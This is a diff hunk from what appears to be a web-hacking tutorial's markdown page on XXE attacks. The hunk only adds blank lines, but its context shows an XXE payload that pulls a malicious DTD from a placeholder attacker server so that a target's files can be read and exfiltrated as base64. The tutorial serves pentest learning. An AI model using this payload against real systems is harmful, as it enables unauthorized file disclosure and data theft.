@@ -51,9 +51,11 @@ Sometimes the server doesn't show the file we want to output. We can try to make
 
 <img src="https://github.com/alejandro-pentest/Hacking-Web/assets/161533623/938762fb-89a8-4b18-94ba-8ecc5f2e57c3" width="600">
 - This time the Wrapper we are using is: <br />
+
 ```xml
 <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "<AttackerServer>/malicious.dtd"> %xxe;]>
 ```
+
 <img src="https://github.com/alejandro-pentest/Hacking-Web/assets/161533623/938762fb-89a8-4b18-94ba-8ecc5f2e57c3" width="600">
 
 - Getting the base64 file from the target and decoding it.
